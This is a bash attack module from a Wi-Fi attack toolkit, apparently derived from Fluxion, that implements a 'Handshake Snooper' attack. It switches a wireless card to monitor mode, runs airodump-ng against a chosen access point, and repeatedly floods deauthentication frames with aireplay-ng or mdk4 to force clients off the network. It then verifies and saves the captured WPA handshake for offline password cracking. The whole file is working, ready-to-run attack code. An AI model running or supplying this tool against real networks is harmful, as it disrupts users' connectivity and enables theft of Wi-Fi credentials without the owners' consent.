#!/usr/bin/env bash

# ============================================================ #
# ============= < Handshake Snooper Parameters > ============= #
# ============================================================ #

HandshakeSnooperState="Not Ready"

# ============================================================ #
# ========= < Handshake Snooper Helper Subroutines > ========= #
# ============================================================ #
handshake_snooper_header() {
  capcap_header; capcap_target_show; echo
}

# ============================================================ #
# ============= < Handshake Snooper Subroutines > ============ #
# ============================================================ #
handshake_snooper_arbiter_daemon() {
  if [ ${#@} -lt 1 -o "$HandshakeSnooperState" != "Running" ]; then
    return 1;
  fi

  # Start daemon in the running state to continue execution until aborted,
  # or until a hash has been verified to exist in the capture file.
  # NOTE: The line below must remain before trap to prevent race conditions.
  local handshake_snooper_arbiter_daemon_state="running"

  handshake_snooper_arbiter_daemon_abort() {
    handshake_snooper_arbiter_daemon_state="aborted"
    if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
      kill $handshake_snooper_arbiter_daemon_viewerPID
    fi

    handshake_snooper_stop_deauthenticator
    handshake_snooper_stop_captor

    local -r now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $HandshakeSnooperArbiterAbortedWarning" >> \
      "$CAPCAPWorkspacePath/handshake_snooper.log"
    exit 2
  }

  trap handshake_snooper_arbiter_daemon_abort SIGABRT

  source "$CAPCAPLibPath/HashUtils.sh"
  source "$CAPCAPLibPath/ColorUtils.sh"

  # Cleanup files we've previously created to avoid conflicts.
  sandbox_remove_workfile "$CAPCAPWorkspacePath/capture/dump-*"

  # Truncate the log before opening the viewer so tail -f starts clean,
  # with no stale content from previous runs and no "file truncated" message.
  > "$CAPCAPWorkspacePath/handshake_snooper.log"

  # Display some feedback to the user to assure verifier is working.
  capcap_window_open handshake_snooper_arbiter_daemon_viewerPID \
    "Handshake Snooper Arbiter Log" "$BOTTOMLEFT" "#000000" "#CCCCCC" \
    "tail -f \"$CAPCAPWorkspacePath/handshake_snooper.log\""

  local now=$(env -i date '+%H:%M:%S')
  echo -e "[$now] $HandshakeSnooperStartingArbiterNotice" >> \
    "$CAPCAPWorkspacePath/handshake_snooper.log"

  handshake_snooper_start_captor
  handshake_snooper_start_deauthenticator

  local handshake_snooper_arbiter_daemon_verified=1 # Assume it hasn't been verified yet (1 => false/error).

  # Keep snooping and verifying until we've got a valid hash from the capture file.
  while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
      "$CAPCAPWorkspacePath/handshake_snooper.log"
    capcap_status "SNOOPING interval=${HandshakeSnooperVerifierInterval}s"
    sleep $HandshakeSnooperVerifierInterval &
    wait $! # Using wait to asynchronously catch flags while waiting.

    # If synchronously searching, stop the captor and deauthenticator before checking.
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" ]; then
      now=$(env -i date '+%H:%M:%S')
      echo -e "[$now] $HandshakeSnooperStoppingForVerifierNotice" >> \
        "$CAPCAPWorkspacePath/handshake_snooper.log"
      handshake_snooper_stop_deauthenticator
      handshake_snooper_stop_captor
      mv "$CAPCAPWorkspacePath/capture/dump-01.cap" \
        "$CAPCAPWorkspacePath/capture/recent.cap"
    else
      if [ -x "$(command -v pyrit)" ]; then
        pyrit -r "$CAPCAPWorkspacePath/capture/dump-01.cap" \
          -o "$CAPCAPWorkspacePath/capture/recent.cap" stripLive &> \
          $CAPCAPOutputDevice
      else
        mv "$CAPCAPWorkspacePath/capture/dump-01.cap" \
           "$CAPCAPWorkspacePath/capture/recent.cap" &>> $CAPCAPOutputDevice
      fi
    fi

    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $HandshakeSnooperSearchingForHashesNotice" >> \
      "$CAPCAPWorkspacePath/handshake_snooper.log"
    hash_check_handshake "$HandshakeSnooperVerifierIdentifier" \
      "$CAPCAPWorkspacePath/capture/recent.cap" \
      "$CapCapTargetSSID" "$CapCapTargetMAC"
    handshake_snooper_arbiter_daemon_verified=$?

    # If synchronously searching, restart the captor and deauthenticator after checking.
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" -a \
      $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
      sandbox_remove_workfile "$CAPCAPWorkspacePath/capture/*"

      handshake_snooper_start_captor
      handshake_snooper_start_deauthenticator
    fi
  done

  # Assure all processes are stopped before proceeding.
  handshake_snooper_stop_deauthenticator
  handshake_snooper_stop_captor

  local completionTime=$(env -i date '+%H:%M:%S')

  # Assure we've got a directory to store hashes into.
  mkdir -p "$CAPCAPPath/attacks/Handshake Snooper/handshakes/"

  # Move handshake to storage if one was acquired.
  local -r savedHandshakePath="$CAPCAPPath/attacks/Handshake Snooper/handshakes/$CapCapTargetSSIDClean-$CapCapTargetMAC.cap"
  mv "$CAPCAPWorkspacePath/capture/recent.cap" "$savedHandshakePath"
  capcap_status "HANDSHAKE_CAPTURED path=$savedHandshakePath"

  # Tell the operator exactly what was saved and what to do with it. The
  # arbiter window is a plain tail, so the path belongs here and not only in
  # the main window banner.
  echo -e "[$completionTime] $HandshakeSnooperArbiterSuccededNotice" >> \
    "$CAPCAPWorkspacePath/handshake_snooper.log"
  # shellcheck disable=SC2059
  echo -e "[$completionTime] $(printf "$HandshakeSnooperSavedFileNotice" "$savedHandshakePath")" >> \
    "$CAPCAPWorkspacePath/handshake_snooper.log"
  echo -e "[$completionTime] $HandshakeSnooperArbiterCompletedTip" >> \
    "$CAPCAPWorkspacePath/handshake_snooper.log"

  # Write success flag so the main window polling loop can detect completion
  # and update its display without waiting for manual user input.
  touch "$CAPCAPWorkspacePath/handshake_success.flag"

  # Close the log viewer — success feedback is shown in the main window.
  if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
    kill $handshake_snooper_arbiter_daemon_viewerPID
  fi

  # Signal parent process the verification terminated.
  kill -s SIGABRT $1
}

handshake_snooper_stop_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then
    kill -s SIGINT $HandshakeSnooperCaptorPID &>> $CAPCAPOutputDevice
  fi

  HandshakeSnooperCaptorPID=""
}

handshake_snooper_start_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

  handshake_snooper_stop_captor

  # Ensure jammer interface is in monitor mode and UP before starting captor
  # This prevents "interface down" errors during tracker restarts
  # Only set mode if not already in monitor mode to avoid disrupting the interface
  echo "Verifying captor interface monitor mode..." >> $CAPCAPOutputDevice
  local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
  if [ "$currentMode" != "monitor" ]; then
    echo "Setting captor interface to monitor mode (current: $currentMode)..." >> $CAPCAPOutputDevice
    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &>> $CAPCAPOutputDevice; then
      echo "Warning: Failed to set captor interface to monitor mode" >> $CAPCAPOutputDevice
    fi
    sleep 1
  else
    echo "Captor interface already in monitor mode, skipping..." >> $CAPCAPOutputDevice
  fi

  local parentPID
  capcap_window_open parentPID \
    "Handshake Captor (CH $CapCapTargetChannel)" "$TOPLEFT" "#000000" "#FFFFFF" \
    "airodump-ng --ignore-negative-one -d $CapCapTargetMAC -w \"$CAPCAPWorkspacePath/capture/dump\" -c $CapCapTargetChannel -a $HandshakeSnooperJammerInterface"

  while [ ! "$HandshakeSnooperCaptorPID" ]; do
    sleep 1 &
    wait $!
    HandshakeSnooperCaptorPID=$(pgrep -P $parentPID)
  done
}

handshake_snooper_stop_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
    kill $HandshakeSnooperDeauthenticatorPID &>> $CAPCAPOutputDevice
  fi

  HandshakeSnooperDeauthenticatorPID=""
  sandbox_remove_workfile "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
}

handshake_snooper_start_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

  handshake_snooper_stop_deauthenticator

  # Ensure jammer interface is in monitor mode before starting
  # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
  # Only set mode if not already in monitor mode to avoid disrupting the interface
  echo "Verifying jammer interface monitor mode..." >> $CAPCAPOutputDevice
  local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
  if [ "$currentMode" != "monitor" ]; then
    echo "Setting jammer interface to monitor mode (current: $currentMode)..." >> $CAPCAPOutputDevice
    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &>> $CAPCAPOutputDevice; then
      echo "Warning: Failed to set jammer interface to monitor mode" >> $CAPCAPOutputDevice
    fi
    sleep 1
  else
    echo "Jammer interface already in monitor mode, skipping..." >> $CAPCAPOutputDevice
  fi

  # Monitor mode resets the radio to its default channel. aireplay-ng does not
  # switch channels itself, so without this the deauth frames go out on the
  # wrong channel and no client ever drops.
  if [ "$CapCapTargetChannel" ]; then
    if interface_set_channel \
      "$HandshakeSnooperJammerInterface" "$CapCapTargetChannel"; then
      echo "Jammer locked to target channel $CapCapTargetChannel." \
        >> $CAPCAPOutputDevice
    else
      echo -e "$CAPCAPVLine $HandshakeSnooperChannelSetWarning" \
        >> "$CAPCAPOutputDevice"
    fi
  fi

  local targetClients=""
  local targetMode="all"
  case "$HandshakeSnooperTargetClients" in
    broadcast|"")
      targetMode="broadcast"
      ;;
    all)
      targetMode="all"
      targetClients="${CapCapTargetClientsMAC[*]}"
      ;;
    *)
      targetMode="subset"
      targetClients="$HandshakeSnooperTargetClients"
      ;;
  esac

  if [ "$targetMode" = "all" ] && [ ! "$targetClients" ]; then
    targetMode="broadcast"
  fi

  local deauthWindowTitle="Deauthenticating all clients on $CapCapTargetSSID"
  if [ "$targetMode" = "subset" ]; then
    deauthWindowTitle="Deauthenticating selected clients on $CapCapTargetSSID"
  fi

  # Start deauthenticators.
  case "$HandshakeSnooperDeauthenticatorIdentifier" in
    "$HandshakeSnooperAireplayMethodOption")
      if [ "$targetClients" ]; then
        capcap_window_open HandshakeSnooperDeauthenticatorPID \
          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
          "while true; do sleep 7; for client in $targetClients; do timeout 3 aireplay-ng --deauth=100 -a $CapCapTargetMAC -c \$client --ignore-negative-one $HandshakeSnooperJammerInterface; done; done"
      else
        capcap_window_open HandshakeSnooperDeauthenticatorPID \
          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
          "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $CapCapTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done"
      fi
    ;;
    "$HandshakeSnooperMdk4MethodOption")
      if [ "$targetMode" = "subset" ]; then
        printf '%s\n' $targetClients > "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
        capcap_window_open HandshakeSnooperDeauthenticatorPID \
          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
          "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b \"$CAPCAPWorkspacePath/mdk4_blacklist.lst\" -c $CapCapTargetChannel; done"
      else
        capcap_window_open HandshakeSnooperDeauthenticatorPID \
          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
          "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -B $CapCapTargetMAC -c $CapCapTargetChannel; done"
      fi
    ;;
  esac
}


handshake_snooper_unset_deauthenticator_identifier() {
  if [ ! "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 1; fi
  HandshakeSnooperDeauthenticatorIdentifier=""
}

handshake_snooper_set_deauthenticator_identifier() {
  if [ "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 0; fi

  handshake_snooper_unset_deauthenticator_identifier

  if [ "$CAPCAPAuto" ]; then
    if [ "$CAPCAPDeauthMethod" = "mdk4" ]; then
      HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperMdk4MethodOption"
    else
      HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperAireplayMethodOption"  # Default to aireplay-ng in auto mode until mdk4's traffic-wait issue is fixed upstream.
    fi
    return 0
  fi

  local methods=(
    "$HandshakeSnooperMonitorMethodOption"
    "$HandshakeSnooperAireplayMethodOption"
    "$HandshakeSnooperMdk4MethodOption"
    "$CAPCAPGeneralBackOption"
  )
  if [ "$HandshakeSnooperMethodExplanation" ]; then
    io_query_choice "$HandshakeSnooperMethodExplanation\n\n$HandshakeSnooperMethodQuery" methods[@]
  else
    io_query_choice "$HandshakeSnooperMethodQuery" methods[@]
  fi

  HandshakeSnooperDeauthenticatorIdentifier=$IOQueryChoice

  echo

  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
    "$CAPCAPGeneralBackOption" ]; then
    handshake_snooper_unset_deauthenticator_identifier
    return 1
  fi
}

handshake_snooper_unset_deauth_target() {
  # Drop the cached client-scan result so the next time we land on the
  # deauth-target step (e.g. after going back and re-picking an interface)
  # the station scan runs again instead of reusing stale results.
  CapCapTargetClientsScanned=""

  if [ ! "$HandshakeSnooperTargetClients" ]; then return 1; fi
  HandshakeSnooperTargetClients=""
}

handshake_snooper_set_deauth_target() {
  if [ "$HandshakeSnooperTargetClients" ]; then return 0; fi

  handshake_snooper_unset_deauth_target

  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
    "$HandshakeSnooperMonitorMethodOption" ]; then
    HandshakeSnooperTargetClients="broadcast"
    return 0
  fi

  if ! interface_is_wireless "$HandshakeSnooperJammerInterface"; then
    HandshakeSnooperTargetClients="broadcast"
    return 0
  fi

  if [ "$CAPCAPAuto" ]; then
    HandshakeSnooperTargetClients="broadcast"
    return 0
  fi

  if [ "$CapCapTargetClientsScanned" != "${CapCapTargetMAC^^}:$CapCapTargetChannel" ]; then
    echo -e "$CAPCAPVLine $CAPCAPStartingScannerNotice"
    capcap_target_scan_clients \
      "$HandshakeSnooperJammerInterface" "$CapCapTargetMAC" "$CapCapTargetChannel"
  fi

  local broadcastCapable=0
  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
    "$HandshakeSnooperAireplayMethodOption" ]; then
    broadcastCapable=1
  fi

  local selectedClients
  if ! capcap_target_select_clients selectedClients "$broadcastCapable"; then
    return 1
  fi
  HandshakeSnooperTargetClients="${selectedClients:-broadcast}"
}

handshake_snooper_unset_jammer_interface() {
  if [ ! "$HandshakeSnooperJammerInterface" ]; then
    HandshakeSnooperJammerInterfaceOriginal=""
    return 1
  fi

  # Deallocate the interface from CapCapInterfaces so it can be reused.
  # Pass the renamed interface (e.g. fluxwl0) — that's the current real name
  # in /sys/class/net, which capcap_deallocate_interface needs for interface_is_real.
  capcap_deallocate_interface "$HandshakeSnooperJammerInterface" 2>/dev/null

  HandshakeSnooperJammerInterface=""
  HandshakeSnooperJammerInterfaceOriginal=""

  # Check if we're automatically selecting the interface & skip
  # this one if so to take the user back properly.
  local interfacesAvailable
  readarray -t interfacesAvailable < <(attack_targetting_interfaces)

  if [ ${#interfacesAvailable[@]} -le 1 ]; then return 2; fi
}

handshake_snooper_set_jammer_interface() {
  if [ "$HandshakeSnooperJammerInterface" ]; then return 0; fi

  # NOTICE: The code below should be excluded because the interface selected
  # below is also being used as the monitoring interface (required)!
  #if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
  #  "$HandshakeSnooperMonitorMethodOption" ]; then return 0; fi

  if [ ! "$HandshakeSnooperJammerInterfaceOriginal" ]; then
    echo "Running get jammer interface." >> $CAPCAPOutputDevice
    if ! capcap_get_interface attack_targetting_interfaces \
      "$HandshakeSnooperJammerInterfaceQuery"; then
      echo "Failed to get jammer interface" >> $CAPCAPOutputDevice
      return 1
    fi
    HandshakeSnooperJammerInterfaceOriginal=$CapCapInterfaceSelected
  fi

  local selectedInterface=$HandshakeSnooperJammerInterfaceOriginal

  # If the user picked a fluxwl* name from the interface list (already renamed by
  # the scanner), use it directly — capcap_allocate_interface would try to rename
  # it again, and CapCapInterfaces[$fluxwl*] returns the original hw name (reverse
  # mapping), which no longer exists as an interface name.
  if [[ "$selectedInterface" == fluxwl* ]]; then
    HandshakeSnooperJammerInterface="$selectedInterface"
    local hwName="${CapCapInterfaces[$selectedInterface]}"
    [ -n "$hwName" ] && HandshakeSnooperJammerInterfaceOriginal="$hwName"
    return 0
  fi

  if ! capcap_allocate_interface $selectedInterface; then
    echo "Failed to allocate jammer interface" >> $CAPCAPOutputDevice
    return 2
  fi

  echo "Succeeded get jammer interface." >> $CAPCAPOutputDevice

  # Use the renamed monitor interface (e.g. fluxwl0), not the original name.
  local jammerIface=${CapCapInterfaces[$selectedInterface]:-$selectedInterface}

  HandshakeSnooperJammerInterface=$jammerIface
}

handshake_snooper_unset_verifier_identifier() {
  if [ ! "$HandshakeSnooperVerifierIdentifier" ]; then return 1; fi
  HandshakeSnooperVerifierIdentifier=""
}

handshake_snooper_set_verifier_identifier() {
  if [ "$HandshakeSnooperVerifierIdentifier" ]; then return 0; fi

  handshake_snooper_unset_verifier_identifier

  # cowpatty is the recommended/default handshake verifier for non-interactive
  # runs. aircrack-ng is offered as an alternative (it can validate modern
  # WPA2/PMF handshakes that cowpatty rejects, but is more optimistic about
  # partial captures), as is pyrit when installed.
  if [ "$CAPCAPAuto" ]; then
    HandshakeSnooperVerifierIdentifier="cowpatty"
    return 0
  fi

  local choices=(
    "$CAPCAPHashVerificationMethodAircrackOption"
    "$CAPCAPHashVerificationMethodCowpattyOption"
  )
  # Add pyrit to the options if available.
  if [ -x "$(command -v pyrit)" ]; then
    choices+=("$CAPCAPHashVerificationMethodPyritOption")
  fi
  choices+=("$CAPCAPGeneralBackOption")

  io_query_choice "$CAPCAPHashVerificationMethodQuery" choices[@]

  echo

  case "$IOQueryChoice" in
    "$CAPCAPHashVerificationMethodPyritOption")
      HandshakeSnooperVerifierIdentifier="pyrit" ;;
    "$CAPCAPHashVerificationMethodAircrackOption")
      HandshakeSnooperVerifierIdentifier="aircrack-ng" ;;
    "$CAPCAPHashVerificationMethodCowpattyOption")
      HandshakeSnooperVerifierIdentifier="cowpatty" ;;
    "$CAPCAPGeneralBackOption")
      handshake_snooper_unset_verifier_identifier
      return 1
      ;;
  esac
}

handshake_snooper_unset_verifier_interval() {
  if [ ! "$HandshakeSnooperVerifierInterval" ]; then return 1; fi
  HandshakeSnooperVerifierInterval=""
}

handshake_snooper_set_verifier_interval() {
  if [ "$HandshakeSnooperVerifierInterval" ]; then return 0; fi

  handshake_snooper_unset_verifier_interval

  if [ "$CAPCAPAuto" ]; then
    HandshakeSnooperVerifierInterval=30
    return 0
  fi

  local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$CAPCAPGeneralBackOption")
  io_query_choice "$HandshakeSnooperVerifierIntervalQuery" choices[@]

  case "$IOQueryChoice" in
    "$HandshakeSnooperVerifierInterval30SOption")
      HandshakeSnooperVerifierInterval=30 ;;
    "$HandshakeSnooperVerifierInterval60SOption")
      HandshakeSnooperVerifierInterval=60 ;;
    "$HandshakeSnooperVerifierInterval90SOption")
      HandshakeSnooperVerifierInterval=90 ;;
    "$CAPCAPGeneralBackOption")
      handshake_snooper_unset_verifier_interval
      return 1
      ;;
  esac
}

handshake_snooper_unset_verifier_synchronicity() {
  if [ ! "$HandshakeSnooperVerifierSynchronicity" ]; then return 1; fi
  HandshakeSnooperVerifierSynchronicity=""
}

handshake_snooper_set_verifier_synchronicity() {
  if [ "$HandshakeSnooperVerifierSynchronicity" ]; then return 0; fi

  handshake_snooper_unset_verifier_synchronicity

  if [ "$CAPCAPAuto" ]; then
    HandshakeSnooperVerifierSynchronicity="non-blocking"
    return 0
  fi

  local choices=(
    "$HandshakeSnooperVerifierSynchronicityAsynchronousOption"
    "$HandshakeSnooperVerifierSynchronicitySynchronousOption"
    "$CAPCAPGeneralBackOption"
  )

  io_query_choice "$HandshakeSnooperVerifierSynchronicityQuery" choices[@]

  case "$IOQueryChoice" in
    "$HandshakeSnooperVerifierSynchronicityAsynchronousOption")
      HandshakeSnooperVerifierSynchronicity="non-blocking" ;;
    "$HandshakeSnooperVerifierSynchronicitySynchronousOption")
      HandshakeSnooperVerifierSynchronicity="blocking" ;;
    "$CAPCAPGeneralBackOption")
      handshake_snooper_unset_verifier_synchronicity
      return 1
      ;;
  esac
}


# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if [ ! "$HandshakeSnooperCLIArguments" ]; then
  if ! HandshakeSnooperCLIArguments=$(
    getopt --options="v:i:j:a" \
      --longoptions="verifier:,interval:,jammer:,asynchronous" \
      --name="Handshake Snooper V$CAPCAPVersion.$CAPCAPRevision" -- "$@"
    );then
    echo -e "${CRed}Aborted$CClr, parameter error detected..."
    sleep 5
    capcap_handle_exit
  fi

  declare -r HandshakeSnooperCLIArguments=$HandshakeSnooperCLIArguments

  eval set -- "$HandshakeSnooperCLIArguments" # Set environment parameters.
fi


# ============================================================ #
# ============= < Argument Loaded Configurables > ============ #
# ============================================================ #
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -v|--verifier)
      HandshakeSnooperVerifierIdentifier=$2; shift;;
    -i|--interval)
      HandshakeSnooperVerifierInterval=$2; shift;;
    -j|--jammer)
      HandshakeSnooperJammerInterfaceOriginal=$2; shift;;
    -a|--asynchronous)
      HandshakeSnooperVerifierSynchronicity="non-blocking";;
  esac
  shift # Shift new parameters
done


# ============================================================ #
# ===================== < CapCap Hooks > ==================== #
# ============================================================ #
attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

attack_tracking_interfaces() {
  # Determine required band from target channel.
  local __requiredBand=""
  if [ "$CapCapTargetChannel" ]; then
    local __ch=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
    if [ -n "$__ch" ] && [ "$__ch" -gt 14 ]; then
      __requiredBand="5GHz"
    fi
  fi
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    if [ "$__requiredBand" ]; then
      interface_bands "$interface" 2>/dev/null
      if [[ "${InterfaceBands:-}" != *"$__requiredBand"* ]]; then continue; fi
    fi
    echo "$interface"
  done
  echo "" # This enables the Skip option.
}

unprep_attack() {
  HandshakeSnooperState="Not Ready"

  handshake_snooper_unset_verifier_synchronicity
  handshake_snooper_unset_verifier_interval
  handshake_snooper_unset_verifier_identifier
  handshake_snooper_unset_deauth_target
  handshake_snooper_unset_jammer_interface
  handshake_snooper_unset_deauthenticator_identifier

  sandbox_remove_workfile "$CAPCAPWorkspacePath/capture"

  # Always return success to allow tracker channel change handling to continue
  return 0
}

prep_attack() {
  mkdir -p "$CAPCAPWorkspacePath/capture"

  IOUtilsHeader="handshake_snooper_header"

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local sequence=(
    "set_deauthenticator_identifier"
    "set_jammer_interface"
    "set_deauth_target"
    "set_verifier_identifier"
    "set_verifier_interval"
    "set_verifier_synchronicity"
  )

  if ! capcap_do_sequence handshake_snooper sequence[@]; then
    return 1
  fi

  HandshakeSnooperState="Ready"
}

load_attack() {
  local -r configurationPath=$1

  local configuration
  readarray -t configuration < "$configurationPath"

  HandshakeSnooperDeauthenticatorIdentifier=${configuration[0]}
  HandshakeSnooperJammerInterfaceOriginal=${configuration[1]}
  HandshakeSnooperVerifierIdentifier=${configuration[2]}
  HandshakeSnooperVerifierInterval=${configuration[3]}
  HandshakeSnooperVerifierSynchronicity=${configuration[4]}
  HandshakeSnooperTargetClients=${configuration[5]:-broadcast}
}

save_attack() {
  local -r configurationPath=$1

  # Store/overwrite attack configuration for pause & resume.
  # Order: DeauthID, JammerWI, VerifId, VerifInt, VerifSync, TargetClients
  echo "$HandshakeSnooperDeauthenticatorIdentifier" > "$configurationPath"
  echo "$HandshakeSnooperJammerInterfaceOriginal" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierIdentifier" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierInterval" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierSynchronicity" >> "$configurationPath"
  echo "$HandshakeSnooperTargetClients" >> "$configurationPath"
}

stop_attack() {
  if [ "$HandshakeSnooperArbiterPID" ]; then
    kill -s SIGABRT $HandshakeSnooperArbiterPID &>> $CAPCAPOutputDevice
  fi

  HandshakeSnooperArbiterPID=""

  HandshakeSnooperState="Stopped"
}

start_attack() {
  if [ "$HandshakeSnooperState" = "Running" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Ready" ]; then return 1; fi
  HandshakeSnooperState="Running"

  handshake_snooper_arbiter_daemon $$ &>> $CAPCAPOutputDevice &
  HandshakeSnooperArbiterPID=$!
}

# FLUXSCRIPT END
